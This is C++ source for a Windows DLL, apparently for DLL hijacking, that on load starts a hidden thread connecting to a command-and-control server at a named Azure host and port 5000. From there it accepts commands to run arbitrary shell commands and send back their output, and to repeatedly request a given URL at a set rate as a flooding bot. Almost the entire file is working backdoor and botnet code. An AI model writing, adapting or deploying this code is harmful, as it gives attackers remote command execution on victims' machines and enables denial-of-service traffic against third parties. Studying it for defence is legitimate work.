//   Dll Hijacking via Thread Creation 
// Author - Vivek Ramachandran 
//  Learn Pentesting Online --  http://PentesterAcademy.com/topics and http://SecurityTube-Training.com 
// Free Infosec Videos --  http://SecurityTube.net 


#include "pch.h"
#include <windows.h>

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <synchapi.h>

#include <iostream>
#include <winsock2.h>
#include <iphlpapi.h>
#include <wininet.h>
#include <chrono>
#include <thread>

#include <iostream>
#include <sstream>
#include <vector>


#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")

// Mutex name for synchronizing access to the flag file
const wchar_t* mutexName = L"DC2DLLMutex";
const char inputParamsSeparator = ' ';
const int ATK_SRV_PORT = 5000;
const char* ATK_SRV_ADDR = "c2server.francecentral.cloudapp.azure.com";

std::vector<std::string> parseCommand(const std::string& input, char separator) {
    std::vector<std::string> result;
    std::istringstream iss(input);
    std::string token;

    while (std::getline(iss, token, separator)) {
        result.push_back(token);
    }

    return result;
}


void showMessageInDLL(const std::string& message) {
    std::wstring wideMessage(message.begin(), message.end());
    LPCWSTR wideString = wideMessage.c_str();

    MessageBoxW(NULL, wideString, L"Popup DLL", MB_OK);
}


void PerformHttpGetRequest(const std::string& url, int requestsPerMinute, int numberOfMinutes) {
    std::string result;
    int delayBetweenRequests = 60/float(requestsPerMinute) * 1000;
    int totalRequestCount = requestsPerMinute * numberOfMinutes;
    HINTERNET hInternet = InternetOpen(L"HTTPGETREQUEST", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        for (int i = 0; i < totalRequestCount; ++i) {
            HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
            InternetCloseHandle(hConnect);
            Sleep(delayBetweenRequests);
        }
        InternetCloseHandle(hInternet);
    }
    
}

extern "C" __declspec(dllexport) void ConnectToServer() {

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock" << std::endl;
        return;
    }

    // Create a socket
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Failed to create socket" << std::endl;
        WSACleanup();
        return;
    }

    // Set up server address
    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(ATK_SRV_PORT);
    serverAddress.sin_addr.s_addr = inet_addr(ATK_SRV_ADDR);


    // Connect to the server
    if (connect(clientSocket, reinterpret_cast<SOCKADDR*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cerr << "Failed to connect to the server" << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return;
    }


    // Send data to the server
    const char* data = "Hello, server!";
    if (send(clientSocket, data, strlen(data), 0) == SOCKET_ERROR) {
        std::cerr << "Failed to send data" << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return;
    }

    std::cout << "Data sent to the server" << std::endl;

    // Receive response from the server
    char command[1024];
    char buffer[1024];
    while (true) {
        memset(command, 0, sizeof(command));
        if (recv(clientSocket, command, sizeof(command) - 1, 0) == SOCKET_ERROR) {
            std::cerr << "Failed to receive data" << std::endl;
            break;
        }

        std::vector<std::string> params = parseCommand(command, inputParamsSeparator);

        std::string action = params[0];

        //Different parsing based on first command (parameters)
        if (action == "PING") { 
            // NO PARAMS
            const char* pong_msg = "PONG";
            send(clientSocket, pong_msg, strlen(pong_msg), 0);
        }
        else if (action == "GET") {
            // PARAMETERS: URL, REQ/MIN, NUM_MIN
            // es. GET|http://localhost:80/resource.html|30|1 

            PerformHttpGetRequest(params[1], stoi(params[2]),stoi(params[3]));
        }
        else if (action == "CMD") {
            // PARAMETER: COMMAND

            std::string cmd = "";

            for (std::size_t i = 1; i < params.size(); ++i) {
                cmd += params[i];  // Concatenate the current string
                if (i < params.size() - 1) {
                    cmd += inputParamsSeparator;
                }
            }

            FILE* commandOutput = _popen(cmd.c_str(), "r");
            if (commandOutput == nullptr) {
                std::cerr << "Failed to execute command." << std::endl;
                continue;
            }

            while (fgets(buffer, sizeof(buffer), commandOutput) != nullptr) {

                //int size = MultiByteToWideChar(CP_UTF8, 0, buffer, -1, nullptr, 0);
                //wchar_t* msg = new wchar_t[size];
                //MultiByteToWideChar(CP_UTF8, 0, buffer, -1, msg, size);
                //MessageBox(NULL, msg, L"Popup DLL", MB_OK);

                // Send the output to the socket
                send(clientSocket, buffer, strlen(buffer), 0);
            }
            _pclose(commandOutput);
            //MessageBoxW(NULL, L"CMD ", L"Popup DLL", MB_OK);
        }
        else {
            // FUTURE IMPL.
            MessageBoxW(NULL, L"Invalid action", L"Popup DLL", MB_OK);
        }

        //showMessageInDLL(params[0]);

        if (command == nullptr || strnlen(command, 1024) == 0) { //dovrebbe esserci?
            std::cerr << "No command." << std::endl;
            continue;
        }

        //int size = MultiByteToWideChar(CP_UTF8, 0, command, -1, nullptr, 0);
        //wchar_t* msg = new wchar_t[size];
        //MultiByteToWideChar(CP_UTF8, 0, buffer, -1, msg, size);
        //MessageBox(NULL, msg, L"Popup DLL", MB_OK);
    }

    // Close the socket and cleanup Winsock
    closesocket(clientSocket);
    WSACleanup();
}




DWORD WINAPI ThreadFunction(LPVOID lpParameter)
{

    HANDLE hMutex = CreateMutexW(nullptr, FALSE, mutexName);

    if (hMutex == nullptr)
    {
        //MessageBox(NULL,            TEXT("nullptr"),            TEXT("DLL Hijack BVS"),            MB_ICONERROR | MB_OK);
        std::cerr << "Failed to create mutex." << std::endl;
        return 0;
    }
    else if (GetLastError() == ERROR_ALREADY_EXISTS) {
        //MessageBox(NULL, TEXT("ERROR ALREADY EXISTS"), TEXT("DLL Hijack BVS"), MB_ICONERROR | MB_OK);
        return 0;
    }
    ConnectToServer();

    //ReleaseMutex(hMutex);
    CloseHandle(hMutex); //gets here if while(true) crashes someway (no try catch structure so far)

    return 1;
}




BOOL WINAPI
DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{

    HANDLE threadHandle;

    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:

        // Create a thread and close the handle as we do not want to use it to wait for it 

        threadHandle = CreateThread(NULL, 0, ThreadFunction, NULL, 0, NULL);
        CloseHandle(threadHandle);

        break;

    case DLL_PROCESS_DETACH:
        // Code to run when the DLL is freed
        break;

    case DLL_THREAD_ATTACH:
        // Code to run when a thread is created during the DLL's lifetime
        break;

    case DLL_THREAD_DETACH:
        // Code to run when a thread ends normally.
        break;
    }
    return TRUE;
}